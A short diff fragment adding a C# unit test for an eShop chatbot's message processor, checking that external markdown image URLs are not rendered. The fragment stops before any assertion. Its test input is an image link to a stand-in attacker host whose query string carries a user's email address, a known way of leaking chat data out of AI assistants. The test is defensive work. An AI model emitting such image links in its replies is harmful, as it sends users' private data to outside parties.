+using eShop.WebApp.Chatbot;
+
+namespace eShop.Application.UnitTests;
+
+[TestClass]
+public class MessageProcessorTests
+{
+    [TestMethod]
+    public void AllowImagesDoesNotRenderExternalImageUrls()
+    {
+        var html = MessageProcessor.AllowImages("![x](https://attacker.example/?d=jane@example.com)").Value;
